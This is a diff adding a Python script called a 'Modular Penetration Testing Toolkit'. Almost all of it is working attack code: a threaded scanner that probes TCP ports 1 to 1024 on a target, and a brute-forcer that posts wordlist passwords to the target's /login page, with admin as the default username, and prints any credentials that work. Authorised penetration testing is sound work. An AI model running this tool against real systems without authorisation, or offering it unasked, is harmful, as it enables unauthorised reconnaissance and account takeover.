@@ -1,0 +1,66 @@
+import argparse
+import socket
+import requests
+import threading
+
+
+
+def scan_port(target, port):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(1)
+        result = s.connect_ex((target, port))
+        if result == 0:
+            print(f"[+] Port {port} is open")
+        s.close()
+    except Exception as e:
+        print(f"Error scanning port {port}: {e}")
+
+
+def port_scanner(target):
+    print(f"Scanning ports on {target}...\n")
+    for port in range(1, 1025):
+        thread = threading.Thread(target=scan_port, args=(target, port))
+        thread.start()
+
+
+
+def brute_force_http(target, username, wordlist):
+    print(f"Starting brute-force attack on {target}...\n")
+
+    url = f"http://{target}/login"
+
+    try:
+        with open(wordlist, "r") as passwords:
+            for password in passwords:
+                password = password.strip()
+                data = {"username": username, "password": password}
+                response = requests.post(url, data=data)
+
+                if "Invalid" not in response.text:
+                    print(f"[+] Found valid credentials: {username}:{password}")
+                    return
+    except Exception as e:
+        print(f"Error in brute-force attack: {e}")
+
+
+
+def main():
+    parser = argparse.ArgumentParser(description="Modular Penetration Testing Toolkit")
+    parser.add_argument("-t", "--target", help="Target IP/URL", required=True)
+    parser.add_argument("--portscan", help="Run Port Scanner", action="store_true")
+    parser.add_argument("--bruteforce", help="Run Brute-Force Attack", action="store_true")
+    parser.add_argument("-u", "--username", help="Username for brute-force (default: admin)", default="admin")
+    parser.add_argument("-w", "--wordlist", help="Path to password wordlist (default: common_passwords.txt)",
+                        default="wordlists/common_passwords.txt")
+
+    args = parser.parse_args()
+
+    if args.portscan:
+        port_scanner(args.target)
+    if args.bruteforce:
+        brute_force_http(args.target, args.username, args.wordlist)
+
+
+if __name__ == "__main__":
+    main()
